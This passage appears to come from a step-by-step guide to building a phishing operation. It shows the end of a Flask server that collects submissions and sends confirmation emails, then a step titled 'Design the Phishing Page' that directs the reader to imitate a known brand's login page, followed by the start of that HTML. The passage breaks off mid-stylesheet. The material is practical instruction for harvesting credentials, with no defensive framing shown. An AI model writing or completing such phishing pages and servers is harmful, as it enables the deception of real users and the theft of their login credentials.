       send_confirmation_email(username)
       return "Thank you for your response!"

   if __name__ == '__main__':
       app.run(host='0.0.0.0', port=5000)
   ```

2. **Design the Phishing Page**

   Create an HTML file that resembles a legitimate login page. Use a known brand's styling or a professional design.

   ```html
   <!DOCTYPE html>
   <html>
   <head>
       <title>Secure Login Verification</title>
       <style>
           body {
               font-family: Arial, sans-serif;
               background-color: #f0f2f5;
               margin: 0;
               padding: 20px;
           }
           .container {
